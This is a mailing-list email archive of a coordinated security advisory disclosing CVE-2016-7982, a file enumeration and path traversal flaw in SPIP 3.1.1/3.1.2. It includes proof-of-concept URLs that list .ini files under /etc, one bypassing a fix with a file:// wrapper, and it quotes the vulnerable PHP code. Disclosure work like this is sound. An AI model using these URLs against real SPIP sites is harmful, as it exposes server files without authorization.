X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4996" "Wednesday" "12" "October" "2016" "15:29:15" "+0200" "Sysdream Labs" "labs@sysdream.com" "<279a0995-1c21-2dcb-d8e6-b7f9dd215f26@sysdream.com>" "153" "[oss-security] CVE-2016-7982: SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal" nil nil nil "10" "2016101213:29:15" "[oss-security] CVE-2016-7982: SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal" (number mark "U       labs@sysdrea Oct 12  153/4996  " thread-indent "\"[oss-security] CVE-2016-7982: SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15634 invoked by uid 550); 12 Oct 2016 13:29:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15616 invoked from network); 12 Oct 2016 13:29:29 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org, spip-team-owner@rezo.net
Message-ID: <279a0995-1c21-2dcb-d8e6-b7f9dd215f26@sysdream.com>
Date: Wed, 12 Oct 2016 15:29:15 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.3.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="jcv1q9JdJ7EGPGrmQH1QC6qtduUc09l8w"
Subject: [oss-security] CVE-2016-7982: SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal

--jcv1q9JdJ7EGPGrmQH1QC6qtduUc09l8w
Content-Type: multipart/mixed; boundary="kViEivTWkMPJTDRO0pL7hROGclQjeTHPh"
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org, spip-team-owner@rezo.net
Message-ID: <279a0995-1c21-2dcb-d8e6-b7f9dd215f26@sysdream.com>
Subject: CVE-2016-7982: SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal

--kViEivTWkMPJTDRO0pL7hROGclQjeTHPh
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

## SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal (CVE-2016-7982)

### Product Description

SPIP is a publishing system for the Internet, which put importance on colla=
borative working, multilingual environments and ease of use. It is free sof=
tware, distributed under the GNU/GPL licence.

### Vulnerability Description

The `valider_xml` file can be used to enumerate files on the system.

**Access Vector**: remote

**Security Risk**: medium

**Vulnerability**: CWE-538

**CVSS Base Score**: 4.9 (Medium)

**CVE-ID**: CVE-2016-7982

### Proof of Concept

Enumerating `.ini` files inside `/etc` (SPIP 3.1.1) :

    http://spip-dev.srv/ecrire/?exec=3Dvalider_xml&var_url=3D/etc&ext=3Dini=
&recur=3D2

Bypassing SPIP 3.1.2 protection using PHP Wrappers :

    http://spip-dev.srv/ecrire/?exec=3Dvalider_xml&var_url=3Dfile:///etc&ex=
t=3Dini&recur=3D2

### Vulnerable code

    if (is_dir($url)) {
        $dir =3D (substr($url, -1, 1) =3D=3D=3D '/') ? $url : "$url/";
        $ext =3D !preg_match('/^[.*\w]+$/', $req_ext) ? 'php' : $req_ext;
        $files =3D preg_files($dir, "$ext$", $limit, $rec);
        if (!$files and $ext !=3D=3D 'html') {
          $files =3D preg_files($dir, 'html$', $limit, $rec);
          if ($files) {
            $ext =3D 'html';
          }
        }
        if ($files) {
          $res =3D valider_dir($files, $ext, $url);
          list($err, $res) =3D valider_resultats($res, $ext =3D=3D=3D 'html=
');

File names are stored in `$res` and displayed by `echo` on line 146 :

    echo "<h1>", $titre, '<br>', $bandeau, '</h1>',
    "<div style=3D'text-align: center'>", $onfocus, "</div>",
      $res,
      fin_page();



### Timeline (dd/mm/yyyy)

* 15/09/2016 : Initial discovery
* 26/09/2016 : Contact with SPIP Team
* 27/09/2016 : Answer from SPIP Team, sent advisory details
* 27/09/2016 : Incorrect fixes for Path Traversal
* 27/09/2016 : New proof of concept for bypassing Path Traversal sent.
* 27/09/2016 : Bad fix for Path Traversal (23185)
* 28/09/2016 : New proof of concept for bypassing fixes for Path Traversal =
on Windows systems.
* 28/09/2016 : Fixes issued Path Traversal (23200)
* 30/09/2016 : SPIP 3.1.3 Released

### Fixes

* https://core.spip.net/projects/spip/repository/revisions/23207
* https://core.spip.net/projects/spip/repository/revisions/23208
* https://core.spip.net/projects/spip/repository/revisions/23206
* https://core.spip.net/projects/spip/repository/revisions/23202
* https://core.spip.net/projects/spip/repository/revisions/23201
* https://core.spip.net/projects/spip/repository/revisions/23200
* https://core.spip.net/projects/spip/repository/revisions/23191
* https://core.spip.net/projects/spip/repository/revisions/23190
* https://core.spip.net/projects/spip/repository/revisions/23193
* https://core.spip.net/projects/spip/repository/revisions/23188
* https://core.spip.net/projects/spip/repository/revisions/23187
* https://core.spip.net/projects/spip/repository/revisions/23185
* https://core.spip.net/projects/spip/repository/revisions/23182
* https://core.spip.net/projects/spip/repository/revisions/23184


### Affected versions

* Version <=3D 3.1.2

### Credits

* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)


--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream






--kViEivTWkMPJTDRO0pL7hROGclQjeTHPh--

--jcv1q9JdJ7EGPGrmQH1QC6qtduUc09l8w
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJX/jqrAAoJEI60jNnVslmh7/AQALyGeeV5iX21NGLyYsAOc/vV
hbAU19FupQTbiYzXjxfyDSZci8tR3cmd+TFM2uFmDgLSsKv/YBt5ES2e6IhbLFTH
DwOG9QAPdb68Kb1Gev8WX1dA6ByFR0o56LYCV27GYyXs00ud2SIHGx3JX58yjyYY
uoxiW9/fi/0sHXfoHduZT/CGaSpiSYndFcWP66ABiM96L7n4vztPjoNUQv0CKvPi
nG45+UFPklQq1ZS+ZE96h1/iuNSTfAdX30SKbDN+BqSrptjd+5DGp4CIc01loAMf
CWElUTfiutsmAt2WT6VGkVw6vSlMu8Hmm1UEKWTBMx2Eeli3PCAGtoSaBDfAdT84
rw560RnTaWdNZ3rm3YxskHHs0AMFVJBYEozWHZOXpLf0IM9tlr3cNEEuVVxSuNaI
Tm9fYcyzWcx8rMUDVt1FjGApdtUBXp5VsMQoRzP0ohvKJfQy/cVv6JpYupmRJLcZ
uYhZnwz5dQer78fTlGMKGNmOWzOYI2WJeB+HcDMdwOy01mY2DQ6rjji3bcX3Okj7
UTrsgY28O3uJSTQqHaRp20VHv+XvpqrwzQudSz8cWbuAO8l6lAMZeT9Q8PN0gMKP
khvSW5UV8EmuS51NI1snLmU+lyX4DZRAnYmTsm2DQohin6smXdFMkuMuXS/8SSK4
ru1uAD/KWp9YZaHQrI4J
=0SFX
-----END PGP SIGNATURE-----

--jcv1q9JdJ7EGPGrmQH1QC6qtduUc09l8w--
